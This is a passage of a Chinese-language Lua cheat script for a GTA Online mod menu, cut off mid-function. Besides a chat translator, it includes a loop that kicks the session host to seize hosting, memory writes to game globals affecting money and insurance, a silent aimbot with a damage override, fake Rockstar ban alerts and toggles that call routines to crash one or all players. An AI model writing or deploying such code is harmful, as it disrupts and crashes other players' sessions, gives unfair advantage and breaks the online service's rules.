	{ Name = "Serbian", Key = "sr" },
	{ Name = "Slovak", Key = "sk" },
	{ Name = "Slovenian", Key = "sl" },
	{ Name = "Spanish", Key = "es" },
	{ Name = "Swahili", Key = "sw" },
	{ Name = "Swedish", Key = "sv" },
	{ Name = "Tamil", Key = "ta" },
	{ Name = "Telugu", Key = "te" },
	{ Name = "Thai", Key = "th" },
	{ Name = "Turkish", Key = "tr" },
	{ Name = "Ukrainian", Key = "uk" },
	{ Name = "Urdu", Key = "ur" },
	{ Name = "Vietnamese", Key = "vi" },
	{ Name = "Welsh", Key = "cy" },
	{ Name = "Yiddish", Key = "yi" },
}
LangKeys = {}
LangName = {}
LangIndexes = {}
LangLookupByName = {}
LangLookupByKey = {}
PlayerSpooflist = {}
PlayerSpoof = {}

for i=1,#Languages do
	local Language = Languages[i]
	LangKeys[i] = Language.Name
	LangName[i] = Language.Name
	LangIndexes[Language.Key] = i
	LangLookupByName[Language.Name] = Language.Key
	LangLookupByKey[Language.Key] = Language.Name
end
table.sort(LangKeys)
function encode(text)
	return string.gsub(text, "%s", "+")
end
function decode(text)
	return string.gsub(text, "%+", " ")
end
local zidongfanyi = menu.list(fanyiyuyan, '聊天翻译载具', {}, '')
settingtrad = menu.list(zidongfanyi, "翻译设置")
colortradtrad = menu.list(settingtrad, "玩家名称颜色")
menu.on_focus(colortradtrad, function()
	util.yield(50)
	isfocused = false
end)
selectmenu = menu.action(colortradtrad, "已选择 : ".."Color : "..colorselec, {}, "这将保存到配置文件中", function()
	menu.focus(focusref[tonumber(colorselec)])
end)
menu.on_focus(selectmenu, function()
	util.yield(50)
	isfocused = false
end)
for i = 1, 234 do
	focusref[i] = menu.action(colortradtrad, "Color : "..i, {}, "这将保存到配置文件中", function() 
		menu.set_menu_name(selectmenu, "已选择 : ".."Color : "..i)
		colorselec = i
	end)
	menu.on_focus(focusref[i], function()
		isfocused = false
		util.yield(50)
		isfocused = true
		while isfocused do
			if not menu.is_open() then
				isfocused = false
			end
			ptr1 = memory.alloc()
			ptr2 = memory.alloc()
			ptr3 = memory.alloc()
			ptr4 = memory.alloc()
			HUD.GET_HUD_COLOUR(i, ptr1, ptr2, ptr3, ptr4)
			directx.draw_text(0.5, 0.5, "exemple", 5, 0.75, {r = memory.read_int(ptr1)/255, g = memory.read_int(ptr2)/255, b =memory.read_int(ptr3)/255, a= memory.read_int(ptr4)/255}, true)
			util.yield()
		end
	end)
end

menu.text_input(settingtrad, "自定义标签 ["..string.upper(util.get_label_text("MP_CHAT_TEAM")).."] 翻译消息", {"labelteam"}, "将其留空将恢复为原始标签", function(s, click_type)
	if (s == "") then
		teamchatlabel = util.get_label_text("MP_CHAT_TEAM")
	else
		teamchatlabel = s 
	end
	if not (click_type == 4) then
	end
end)
if not (teamchatlabel == util.get_label_text("MP_CHAT_TEAM")) then
	menu.trigger_commands("labelteam "..teamchatlabel)
end


menu.text_input(settingtrad, "自定义标签 ["..string.upper(util.get_label_text("MP_CHAT_ALL")).."] 翻译消息", {"labelall"}, "将其留空将恢复为原始标签", function(s, click_type)
	if (s == "") then
		allchatlabel = util.get_label_text("MP_CHAT_ALL")
	else
		allchatlabel = s 
	end
	if not (click_type == 4) then
	end
end)
if not (teamchatlabel == util.get_label_text("MP_CHAT_TEAM")) then
	menu.trigger_commands("labelall "..allchatlabel)
end

targetlangmenu = menu.slider_text(zidongfanyi, "目标语言", {}, "您需要单击以应用更改", LangName, function(s)
	targetlang = LangLookupByName[LangKeys[s]]
end)

tradlocamenu = menu.slider_text(settingtrad, "翻译信息的位置", {}, "您需要单击以应用更改", {"团队聊天不联网", "团队聊天", "全局聊天不联网", "全局聊天", "通知"}, function(s)
	Tradloca = s
end)
	
traductself = false
menu.toggle(settingtrad, "翻译自己", {}, "", function(on)
	traductself = on	
end)
traductsamelang = false
menu.toggle(settingtrad, "即使语言与所需语言相同,也进行翻译", {}, "可能不会正常工作,因为谷歌是个傻瓜", function(on)
	traductsamelang = on	
end)
oldway = false
menu.toggle(settingtrad, "使用旧方法", {}, players.get_name(players.user()).." [全部]玩家:信息", function(on)
	oldway = on	
end)
traduct = true
menu.toggle(zidongfanyi, "翻译", {"fanyi"}, "", function(on)
	traduct = on	
end, true)
menu.trigger_commands("fanyi off")
traductmymessage = menu.list(zidongfanyi, "发送翻译信息")
finallangmenu = menu.slider_text(traductmymessage, "最终语言", {"finallang"}, "翻译成最终语言.您需要单击以应用更改", LangName, function(s)
   targetlangmessagesend = LangLookupByName[LangKeys[s]]
end)

menu.action(traductmymessage, "发送信息", {"Sendmessage"}, "输入消息的文本", function(on_click)
    util.toast("请输入您的消息")
    menu.show_command_box("Sendmessage ")
end, function(on_command)
    mytext = on_command
    async_http.init("translate.googleapis.com", "/translate_a/single?client=gtx&sl=auto&tl="..targetlangmessagesend.."&dt=t&q="..encode(mytext), function(Sucess)
		if Sucess ~= "" then
			translation, original, sourceLang = Sucess:match("^%[%[%[\"(.-)\",\"(.-)\",.-,.-,.-]],.-,\"(.-)\"")
			for _, pId in ipairs(players.list()) do
				chat.send_targeted_message(pId, players.user(), string.gsub(translation, "%+", " "), false)
			end
		end
	end)
    async_http.dispatch()
end)
botsend = false
chat.on_message(function(packet_sender, message_sender, text, team_chat)
	if not botsend then
		if not traductself and (packet_sender == players.user()) then
		else
			if traduct then
				async_http.init("translate.googleapis.com", "/translate_a/single?client=gtx&sl=auto&tl="..targetlang.."&dt=t&q="..encode(text), function(Sucess)
					if Sucess ~= "" then
						translation, original, sourceLang = Sucess:match("^%[%[%[\"(.-)\",\"(.-)\",.-,.-,.-]],.-,\"(.-)\"")
						if not traductsamelang and (sourceLang == targetlang)then
						
						else
							if oldway then
								sender = players.get_name(players.user())
								translationtext = players.get_name(packet_sender).." : "..decode(translation)
								colorfinal = 1
							else
								sender = players.get_name(packet_sender)
								translationtext = decode(translation)
								colorfinal = colorselec
							end
							if (Tradloca == 1) then						
								sfchat.ADD_MESSAGE(sender, translationtext, teamchatlabel, false, colorfinal)
							end if (Tradloca == 2) then
								botsend = true
								chat.send_message(players.get_name(packet_sender).." : "..decode(translation), true, false, true)
								sfchat.ADD_MESSAGE(sender, translationtext, teamchatlabel, false, colorfinal)
							end if (Tradloca == 3) then
								sfchat.ADD_MESSAGE(sender, translationtext, allchatlabel, false, colorfinal)
							end if (Tradloca == 4) then
								botsend = true
								chat.send_message(players.get_name(packet_sender).." : "..decode(translation), false, false, true)
								sfchat.ADD_MESSAGE(sender, translationtext, allchatlabel, false, colorfinal)
							end if (Tradloca == 5) then
								util.toast(players.get_name(packet_sender).." : "..decode(translation), TOAST_ALL)
							end
						end
					end
				end)
				async_http.dispatch()
			end
		end
	end
	botsend = false
end)
run = 0
while run<10 do 
	Tradloca = menu.get_value(tradlocamenu)
	targetlangmessagesend = LangLookupByName[LangKeys[menu.get_value(finallangmenu)]]
	targetlang = LangLookupByName[LangKeys[menu.get_value(targetlangmenu)]]
	util.yield()
	run = run+1
end
-----------------------------------------------聊天上色
chat_message = menu.list(fanyiyuyan, "聊天昵称加色", {""}, "")

    util.ensure_package_is_installed("lua/yymmlib/YMScaleformLib")
    local chat_scaleform = require("lib.yymmlib.YMScaleformLib")("multiplayer_chat")
    local message_history = {}

    function new_chat_obj(player_name, player_color, tag, text, networked)
        local chat = {
            player_name = player_name,
            player_color = player_color,
            tag = tag, 
            text = text,
            networked = networked
        }
        return chat
    end

    local conditional_coloring = false
    chat_message:toggle("开关", {}, "", function(on)
        conditional_coloring = on
    end)
    local main_root = menu.my_root()
    conditional_coloring_root = chat_message:list("更改颜色", {}, "根据标准条件给玩家上色.在列表中. 我 > 作弊者 > 朋友 > 绿玩")
    general_settings = chat_message:list("通用设置", {}, "")
        max_chat_len = 254
        general_settings:slider("最大聊天长度", {"chatmaxlength"}, "超出聊天长度范围将被自动裁剪.不适用于你.", 1, 254, 254, 1, function(value)
            max_chat_len = value
        end)
        max_chats = 10
        general_settings:slider("最多聊天", {"chatmaxchats"}, "显示/历史记录的最大聊天数.超过数值将不显示.", 1, 20, 10, 1, function(value)
            max_chats = value
        end)
        local display_time = 10
        general_settings:slider("显示时长", {"chatdisptime"}, "聊天框通过新消息或键入内容被唤醒后，聊天框将显示的时间（以秒为单位）.", 1, 300, 10, 1, function(value)
            display_time = value
        end)

        local chat_cooldown_ms = 1000
        general_settings:slider("聊天冷却", {"chatcooldown"}, "每次聊天之间的冷却时间（毫秒）。超过此值的聊天将不会显示.", 0, 10000, 1000, 1, function(value)
            chat_cooldown_ms = value
        end)

    ----------颜色--------
    local hud_colors = {
        me = 224,
        friends = 225,
        strangers = 226,
        modders = 227
    }

    function replace_hud_color(index, color)
        HUD.REPLACE_HUD_COLOUR_WITH_RGBA(index, color.r * 255, color.g * 255, color.b * 255, color.a * 255)
    end

    me_color = {r = 1, g = 0, b = 1, a = 1}
    conditional_coloring_root:colour("我", {"chatmecolor"}, "", me_color, true, function(rgb)
        replace_hud_color(hud_colors.me, rgb)
    end)

    friends_color = {r = 0, g = 1, b = 0, a = 1}
    conditional_coloring_root:colour("好友", {"chatfriendcolor"}, "", friends_color, true, function(rgb)
        replace_hud_color(hud_colors.friends, rgb)
    end)

    strangers_color = {r = 1, g = 1, b = 1, a = 1}
    conditional_coloring_root:colour("绿玩", {"chatstrangercolor"}, "", strangers_color, true, function(rgb)
        replace_hud_color(hud_colors.strangers, rgb)
    end)

    modders_color = {r = 1, g = 0, b = 0, a = 1}
    conditional_coloring_root:colour("作弊者", {"chatmoddercolor"}, "", modders_color, true, function(rgb)
        replace_hud_color(hud_colors.modders, rgb)
    end)

    replace_hud_color(hud_colors.me, me_color)
    replace_hud_color(hud_colors.friends, friends_color)
    replace_hud_color(hud_colors.strangers, strangers_color)
    replace_hud_color(hud_colors.modders, modders_color)

    local muted_players = {}
    local function player(pid)
    end
    players.on_leave(function(pid)
        muted_players[pid] = nil 
    end)

    players.on_join(player)
    players.dispatch_on_join()

    util.create_tick_handler(function()
        chat_scaleform:draw_fullscreen()
    end)

    handle_ptr = memory.alloc(13*8)
    local function pid_to_handle(pid)
        NETWORK.NETWORK_HANDLE_FROM_PLAYER(pid, handle_ptr, 13)
        return handle_ptr
    end

    chat.on_message(function(sender, reserved, text, team_chat, networked, is_auto)
        if players.user() ~= sender then 
            text = text:sub(1, max_chat_len)
        end

            -- coloring player names
            local player_color = 1
            if conditional_coloring then
                local hdl = pid_to_handle(sender)
                if sender == players.user() then 
                    player_color = hud_colors.me
                elseif players.is_marked_as_modder(sender) then 
                    player_color = hud_colors.modders
                elseif NETWORK.NETWORK_IS_FRIEND(hdl) then
                    player_color = hud_colors.friends
                else
                    player_color = hud_colors.strangers
                end
            end

            local tag = if team_chat then "团队" else "全部"
            if tag_mode == 2 then 
                tag = players.get_tags_string(sender)
            elseif tag_mode == 3 then
                tag = custom_tag
            elseif tag_mode == 4 then
                tag = ""
            end

            if muted_players[sender] == nil then
                local this_chat = new_chat_obj(players.get_name(sender), player_color, tag, text, networked)
                message_history[#message_history + 1] = this_chat
            end
            chat_scaleform.RESET()
            if #message_history > max_chats then
                table.remove(message_history, 1)
            end

            for _, chat in pairs(message_history) do
                chat_scaleform.ADD_MESSAGE(chat.player_name, chat.text, chat.tag, chat.networked, chat.player_color)
            end

            chat_scaleform.showFeed()

            local chat_state = chat.get_state()
            if chat_state ~= 0 then
                local chat_draft = chat.get_draft()
                chat.close()
                chat.ensure_open_with_empty_draft(chat_state == 1)
                chat.add_to_draft(chat_draft)
            end
    end)
local weapon_options = menu.list(self, "冲锋选项", {}, "")
menu.toggle_loop(weapon_options, '无敌冲锋', {}, '使用近战时将附近模型推开', function ()
	local is_performing_action = PED.IS_PED_PERFORMING_MELEE_ACTION(PLAYER.PLAYER_PED_ID())
	if is_performing_action then
        menu.trigger_commands("grace on")
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
		FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 29, 25.0, false, true, 0.0, true)
		AUDIO.PLAY_SOUND_FRONTEND(-1, "EMP_Blast", "DLC_HEISTS_BIOLAB_FINALE_SOUNDS", false)
    else
        menu.trigger_commands("grace off")
	end
end)
local other = menu.list(self, "恢复选项", {}, "")
local function bitTest(addr, offset)
    return (memory.read_int(addr) & (1 << offset)) ~= 0
end
menu.toggle_loop(other, "移除保险索赔", {}, "自动认领被毁坏的车辆，这样您就不必给共荣保险打电话.", function()
    local count = memory.read_int(memory.script_global(1585857))
    for i = 0, count do
        local canFix = (bitTest(memory.script_global(1585857 + 1 + (i * 142) + 103), 1) and bitTest(memory.script_global(1585857 + 1 + (i * 142) + 103), 2))
        if canFix then
            MISC.CLEAR_BIT(memory.script_global(1585857 + 1 + (i * 142) + 103), 1)
            MISC.CLEAR_BIT(memory.script_global(1585857 + 1 + (i * 142) + 103), 3)
            MISC.CLEAR_BIT(memory.script_global(1585857 + 1 + (i * 142) + 103), 16)
            util.toast("您的个人载具已被摧毁,它已被自动索赔.")
        end
    end
    util.yield(100)
end)
local muggerWarning
muggerWarning = menu.action(other, "金钱清除", {}, "", function(click_type)
    menu.show_warning(muggerWarning, click_type, "警告: 请三思您的举措，一旦您使用，改变就无法撤消，你的钱就会清空. 仅在您打算摆脱金钱时使用", function()
        menu.delete(muggerWarning)
        local muggerList = menu.list(self, "金钱清除")
        local price = 1000
        menu.click_slider(muggerList, "清除金额", {"muggerprice"}, "", 0, 2000000000, 0, 1000, function(value)
            price = value
        end)
        menu.toggle_loop(muggerList, "应用", {}, "点击后给拉玛打电话请求劫匪,请求后您设置的对应金额就会清除", function()
            memory.write_int(memory.script_global(262145 + 4121), price) 
        end)
        menu.trigger_command(muggerList)
    end)
end)
menu.toggle_loop(online, "强制脚本主机", {}, "夜幕Lua会尽快帮你成为脚本主机", function()
    if players.get_script_host() ~= players.user() and get_transition_state(players.user()) ~= 0 then
        menu.trigger_command(menu.ref_by_path("Players>"..players.get_name_with_tags(players.user())..">Friendly>Give Script Host"))
    end
end)
menu.toggle_loop(online, "自动获取主机", {"alwayshost"}, "夜幕Lua会尽快帮你成为战局主机", function()
	if not (players.get_host() == PLAYER.PLAYER_ID()) and not util.is_session_transition_active() then
		if not (PLAYER.GET_PLAYER_NAME(players.get_host()) == "**Invalid**") then
			menu.trigger_commands("kick"..PLAYER.GET_PLAYER_NAME(players.get_host()))
			util.yield(200)
		end
	end
end)
-----娱乐选项
local startViewMode
    local scope_scaleform
    local gaveHelmet = false
    menu.toggle_loop(funfeatures, '钢铁侠', {}, '', function()
    store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound11.txt'
if not filesystem.is_dir(store_dir) then
    util.toast("夜幕音频没有正确安装！.")
    util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
        menu.trigger_commands("levitate on")
        if not PED.IS_PED_WEARING_HELMET(players.user_ped()) then
            PED.GIVE_PED_HELMET(players.user_ped(), true, 4096, -1)
            gaveHelmet = true
        end
        if startViewMode == nil then
            startViewMode = CAM.GET_CAM_VIEW_MODE_FOR_CONTEXT(context)
        end
        if CAM.GET_CAM_VIEW_MODE_FOR_CONTEXT(context) != 4 then
            CAM.SET_CAM_VIEW_MODE_FOR_CONTEXT(context, 4)
        end
        scope_scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE('REMOTE_SNIPER_HUD')
        GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scope_scaleform, 'REMOTE_SNIPER_HUD')
        GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(scope_scaleform, 255, 255, 255, 255, 0)
        GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
        local barrageInput = 'INPUT_PICKUP'
        if not PAD._IS_USING_KEYBOARD(0) then
            barrageInput = 'INPUT_COVER'
        end
        memory.write_int(memory.script_global(1649593 + 1163), 1)
        SFasd.CLEAR_ALL()
        SFasd.TOGGLE_MOUSE_BUTTONS(false)
        SFasd.SET_DATA_SLOT(2, JSkey.get_control_instructional_button(0, 'INPUT_ATTACK'), '爆炸')
        SFasd.SET_DATA_SLOT(1, JSkey.get_control_instructional_button(0, 'INPUT_AIM'), '光束')
        SFasd.SET_DATA_SLOT(0, JSkey.get_control_instructional_button(0, barrageInput), '弹幕')
        SFasd.DRAW_INSTRUCTIONAL_BUTTONS()
        JSkey.disable_control_action(2, 'INPUT_VEH_MOUSE_CONTROL_OVERRIDE')
        JSkey.disable_control_action(2, 'INPUT_VEH_FLY_MOUSE_CONTROL_OVERRIDE')
        JSkey.disable_control_action(2, 'INPUT_VEH_SUB_MOUSE_CONTROL_OVERRIDE')
        JSkey.disable_control_action(0, 'INPUT_ATTACK')
        JSkey.disable_control_action(0, 'INPUT_AIM')
        if not (JSkey.is_disabled_control_pressed(0, 'INPUT_ATTACK') or JSkey.is_disabled_control_pressed(0, 'INPUT_AIM') or JSkey.is_disabled_control_pressed(0, barrageInput)) then return end
        local a = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
        local b = getOffsetFromCam(80)
        local hash
        if JSkey.is_disabled_control_pressed(0, 'INPUT_ATTACK') then
            hash = util.joaat('VEHICLE_WEAPON_PLAYER_LAZER')
            if not WEAPON.HAS_WEAPON_ASSET_LOADED(hash) then
                WEAPON.REQUEST_WEAPON_ASSET(hash, 31, 26)
                while not WEAPON.HAS_WEAPON_ASSET_LOADED(hash) do
                    util.yield()
                end
            end
        elseif JSkey.is_disabled_control_pressed(0, 'INPUT_AIM') then
            hash = util.joaat('WEAPON_RAYPISTOL')
            if not WEAPON.HAS_PED_GOT_WEAPON(players.user_ped(), hash, false) then
                WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 9999, false, false)
            end
        else
            hash = util.joaat('WEAPON_RPG')
            if not WEAPON.HAS_PED_GOT_WEAPON(players.user_ped(), hash, false) then
                WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 9999, false, false)
            end
            a.x += math.random(0, 100) / 100
            a.y += math.random(0, 100) / 100
            a.z += math.random(0, 100) / 100
        end
        WEAPON.SET_CURRENT_PED_WEAPON(players.user_ped(), util.joaat('WEAPON_UNARMED'), true)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
            a.x, a.y, a.z,
            b.x, b.y, b.z,
            200,
            true,
            hash,
            PLAYER.PLAYER_PED_ID(),
            true, true, -1.0
        )
    end, function()
        if gaveHelmet then
            PED.REMOVE_PED_HELMET(players.user_ped(), true)
            gaveHelmet = false
        end
        HUD._HUD_WEAPON_WHEEL_IGNORE_CONTROL_INPUT(false)
        local pScaleform = memory.alloc_int()
        memory.write_int(pScaleform, scope_scaleform)
        GRAPHICS.SET_SCALEFORM_MOVIE_AS_NO_LONGER_NEEDED(pScaleform)
        menu.trigger_commands("levitate off")
        util.yield()
        CAM.SET_CAM_VIEW_MODE_FOR_CONTEXT(CAM._GET_CAM_ACTIVE_VIEW_MODE_CONTEXT(), startViewMode)
        startViewMode = nil
    end)
-------------------

local fakemessages_root = menu.list(funfeatures, "虚假的R*警告", {}, "被骗了？~")
menu.slider(fakemessages_root, "延迟虚假消息", {}, "在显示虚假消息之前等待多长时间（以秒为单位）", 0, 300, 0, 1, function(s)
    fake_alert_delay = s*1000
end)
local fake_suspend_date = "2023年1月1日"
menu.text_input(fakemessages_root, "自定义暂停日期", {"customsuspensiondate"}, "" , function(on_input)
    fake_suspend_date = on_input
end, "2023年1月1日")
local custom_alert = "你好夜幕！"
menu.action(fakemessages_root, "自定义的虚假消息文本", {"customfakealert"}, "输入您的虚假的R*警告应显示的内容", function(on_click)
    notification("请输入您希望的R*警告显示内容", colors.blue)
    menu.show_command_box("customfakealert" .. " ")
end, function(on_command)
    show_custom_alert_until_enter(on_command)
end)
alert_options = {"禁令", "禁令永久", "服务不可用", "Stand yyds!", "暂时封禁",  "夜幕Lua", "开挂", "举个栗子"}
menu.list_action(fakemessages_root, "假警报", {"fakealert"}, "", alert_options, function(index, value, click_type)
    pluto_switch index do 
        case 1: 
            show_custom_alert_until_enter("您已被禁止进入GTA在线模式。~n~返回Grand Theft Auto V。")
            break 
        case 2:
            show_custom_alert_until_enter("您已被永久禁止进入GTA在线模式。~n~返回Grand Theft Auto V。")
            break
        case 3:
            show_custom_alert_until_enter("Rockstar游戏服务当前不可用。~n~请返回Grand Theft Auto V。")
            break
        case 4:
            show_custom_alert_until_enter("Stand天下第一!")
            break
        case 5:
            show_custom_alert_until_enter("您已被禁止进入GTA在线模式直到 " .. fake_suspend_date .. ".~n~此外,您的GTA在线模式角色将被重置。~n~Grand Theft Auto V。")
            break
        case 6:
            show_custom_alert_until_enter("夜幕yyds！~n~我爱夜幕！")
            break
        case 7:
            show_custom_alert_until_enter("操你妈的~n~不开挂还TM想进线上？告诉你：不可能！")
            break
        case 8:
            show_custom_alert_until_enter(custom_alert)
            break
    end
end)
menu.action(funfeatures, "思空之岛", {""}, "", function(on_click)
    local c = {}
    c.x = 0
    c.y = 0
    c.z = 500
    PED.SET_PED_COORDS_KEEP_VEHICLE(players.user_ped(), c.x, c.y, c.z+5)
    if island_block == 0 or not ENTITY.DOES_ENTITY_EXIST(island_block) then
        request_model_load(1054678467)
        island_block = entities.create_object(1054678467, c)
    end
end)
meteors = false
menu.toggle(funfeatures, "陨落", {"yunluo"}, "战局里的玩家可以看到", function(on)
    if on then
        meteors = true
        start_meteor_shower()
    else
        meteors = false
    end
end, false)
menu.toggle_loop(funfeatures, "奥义.梦想真说", {""}, "战局里的玩家可以看到", function()
    MISC.FORCE_LIGHTNING_FLASH()
end)
menu.toggle(funfeatures, "特斯拉自动驾驶", {}, "我爱和平精英特斯拉车载具皮肤！", function(toggled)
    local player = players.user_ped()
    local playerpos = ENTITY.GET_ENTITY_COORDS(player, false)
    local tesla_ai = util.joaat("u_m_y_baygor")
    local tesla = util.joaat("raiden")
    request_model(tesla_ai)
    request_model(tesla)
    if toggled then     
        if PED.IS_PED_IN_ANY_VEHICLE(player, true) then
            menu.trigger_commands("deletevehicle")
        end
        tesla_ai_ped = entities.create_ped(26, tesla_ai, playerpos, 0)
        tesla_vehicle = entities.create_vehicle(tesla, playerpos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(tesla_ai_ped, true)
        ENTITY.SET_ENTITY_VISIBLE(tesla_ai_ped, false)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(tesla_ai_ped, true)
        PED.SET_PED_INTO_VEHICLE(player, tesla_vehicle, -2)
        PED.SET_PED_INTO_VEHICLE(tesla_ai_ped, tesla_vehicle, -1)
        PED.SET_PED_KEEP_TASK(tesla_ai_ped, true)
        VEHICLE.SET_VEHICLE_COLOURS(tesla_vehicle, 111, 111)
        VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 23, 8, false)
        VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 15, 1, false)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(tesla_vehicle, 111, 147)
        menu.trigger_commands("performance")
        if HUD.IS_WAYPOINT_ACTIVE() then
	    	local pos = HUD.GET_BLIP_COORDS(HUD.GET_FIRST_BLIP_INFO_ID(8))
            TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(tesla_ai_ped, tesla_vehicle, pos.x, pos.y, pos.z, 20, 786603, 0)
        else
            TASK.TASK_VEHICLE_DRIVE_WANDER(tesla_ai_ped, tesla_vehicle, 20, 786603)
        end
    else
        if tesla_ai_ped ~= nil then 
            entities.delete_by_handle(tesla_ai_ped)
        end
        if tesla_vehicle ~= nil then 
            entities.delete_by_handle(tesla_vehicle)
        end
    end
end)
menu.toggle(funfeatures, "世界停电", {"poweroutage"}, "如果世界停电你会干什么？~", function(toggled)
    GRAPHICS.SET_ARTIFICIAL_LIGHTS_STATE(toggled)
end)
action_lua = menu.list(funfeatures, "动作选项", {}, "", function(); end)
    action_lua_load = menu.action(action_lua, "加载动作脚本选项", {""}, "", function()
        notification("正在加载动作脚本,请稍等",colors.blue)
        util.yield(2000)
        require "lib.yymmlib.YMactions"
        menu.delete(action_lua_load)
    end)
local fireworks_root = menu.list(funfeatures, "新年快乐", {}, "")
menu.action(fireworks_root, "放置烟花盒", {"placefireworks"}, "新年快乐，回家看看家人吧~", function(click_type)
    placefirework()
end)
menu.action(fireworks_root, "开始放烟花", {"kaboom"}, "祝你新年快乐哦~。", function(click_type)
    fireworkshow()
end)   

----武器选项
finger_thing = menu.list(weapon, "手指枪", {}, "按B键")
shouzhiqiang()

menu.toggle_loop(weapon, "激光眼", {"lasereyes"}, "按住E键", function(on)
    laser_eyes()
end)
local proxysticks = menu.list(weapon, '粘弹自动爆炸', {}, '')
    menu.toggle_loop(proxysticks, '粘弹自动爆炸', {'JSproxyStickys'}, '使您的粘弹在玩家或NPC附近时自动引爆.', function()
        proxyStickys()
    end)
    menu.toggle(proxysticks, '引爆附近的玩家', {'JSProxyStickyPlayers'}, '如果您的粘性炸弹在玩家附近时自动引爆.', function(toggle)
        proxyStickys_players(toggle)
    end, proxyStickySettings.players)
    menu.toggle(proxysticks, '引爆附近的NPC', {'JSProxyStickyNpcs'}, '如果您的粘性炸弹在NPC附近时自动引爆.', function(toggle)
        proxystickys_npc(toggle)
    end, proxyStickySettings.npcs)
    menu.slider(proxysticks, '爆炸半径', {'JSstickyRadius'}, '粘性炸弹必须离目标多近才会引爆.', 1, 10, proxyStickySettings.radius, 1, function(value)
        proxysticks_radius(value)
    end)
    menu.action(proxysticks, '移除所有粘性炸弹', {'JSremoveStickys'}, '移除所有存在的粘性炸弹(不仅仅是你的).', function()
        WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(util.joaat('weapon_stickybomb'), false)
    end)
pvphelp = menu.list(weapon, "自瞄选项", {"pvphelp"}, "")
local silent_aimbotroot = menu.list(pvphelp, "静默自瞄1.0", {"lancescriptsilentaimbot"}, "")
menu.toggle(silent_aimbotroot, "静默自瞄", {"saimbottoggle"}, "", function(on) SE_Notifications = true
    silent_aimbot = on
    start_silent_aimbot()
end)
menu.toggle_loop(silent_aimbotroot, "最大自瞄范围", {}, "手柄的辅助瞄准功能开启后，将有无限的范围.", function()
    PLAYER.SET_PLAYER_LOCKON_RANGE_OVERRIDE(players.user(), 99999999.0)
end)
menu.toggle(silent_aimbotroot, "静默自瞄玩家", {"saimbotplayers"}, "", function(on)
    satarget_players = on
end)
menu.toggle(silent_aimbotroot, "静默自瞄NPC\'s", {"saimbotpeds"}, "", function(on)
    satarget_npcs = on
end)
menu.toggle(silent_aimbotroot, "用视野指定范围", {"saimbotusefov"}, "你不会通过你的屁眼杀人", function(on)
    satarget_usefov = on
end)
menu.slider(silent_aimbotroot, "视野", {"saimbotfov"}, "", 1, 270, 180, 1, function(s)
    sa_fov = s
end)
menu.toggle(silent_aimbotroot, "忽略车内目标", {"saimbotnovehicles"}, "如果你想装的更像个正常人, 或者射车内目标时遇到问题", function(on)
    satarget_novehicles = on
end)
satarget_nogodmode = true
menu.toggle(silent_aimbotroot, "忽略无敌目标", {"saimbotnogodmodes"}, "因为这有什么意义？", function(on)
    satarget_nogodmode = on
end, true)
menu.toggle(silent_aimbotroot, "好友成为目标", {"saimbottargetfriends"}, "", function(on)
    satarget_targetfriends = on
end)
menu.toggle(silent_aimbotroot, "伤害修改", {"saimbotdmgo"}, "", function(on)
    satarget_damageo = on
end)
menu.slider(silent_aimbotroot, "伤害修改的数值", {"saimbotdamageoverride"}, "", 1, 1000, 100, 1, function(s)
    sa_odmg = s
end)
damage_numbers_list = menu.list(weapon, "伤害数字")
menu.toggle_loop(damage_numbers_list, "伤害数字", {"damagenumbers"}, "", function()
    damage_numbers()
end)
menu.toggle(damage_numbers_list, "包括车辆", {"damagenumbersvehicles"}, "", function (value)
    damage_numbers_target_vehicles = value
end)
menu.slider(damage_numbers_list, "数字尺寸", {"damagenumberstextsize"}, "", 1, 100, 7, 1, function (value)
    damage_numbers_text_size = value * 0.1
end)
damage_numbers_colours_list = menu.list(damage_numbers_list, "颜色设置")
menu.rainbow(menu.colour(damage_numbers_colours_list, "默认颜色", {"damagenumcolour"}, "默认命中的颜色", damage_numbers_health_colour, true, function (value)
    damage_numbers_health_colour = value
end))
menu.rainbow(menu.colour(damage_numbers_colours_list, "暴击颜色", {"damagenumcritcolour"}, "暴击颜色", damage_numbers_crit_colour, true, function (value)
    damage_numbers_crit_colour = value
end))
menu.rainbow(menu.colour(damage_numbers_colours_list, "盔甲颜色", {"damagenumarmourcolour"}, "盔甲颜色", damage_numbers_armour_colour, true, function (value)
    damage_numbers_armour_colour = value
end))
menu.rainbow(menu.colour(damage_numbers_colours_list, "载具颜色", {"damagenumvehiclecolour"}, "载具颜色", damage_numbers_vehicle_colour, true, function (value)
    damage_numbers_vehicle_colour = value
end))
local aimkarma = menu.list(weapon, "瞄准惩罚", {}, "", function(); end)
menu.toggle_loop(aimkarma, '发送脚本事件崩溃', {''}, '如果他瞄准你自动崩溃', function()
    sendscriptcrash()
end)
menu.toggle_loop(aimkarma, '拉海滩', {''}, '自动拉海滩', function()
    sendgobreach()
end)
menu.toggle_loop(aimkarma, '气死我了，来个全局崩', {''}, '如果有sb打你,无差别崩溃全局', function()
    sendallplayercrash()
end)
menu.toggle_loop(aimkarma, '射击', {'JSbulletAimKarma'}, '射击瞄准您的玩家.', function()
    bulletaimkarma()
end)
menu.toggle_loop(aimkarma, '爆炸', {'JSexpAimKarma'}, '使用您的自定义爆炸设置爆炸玩家.', function()
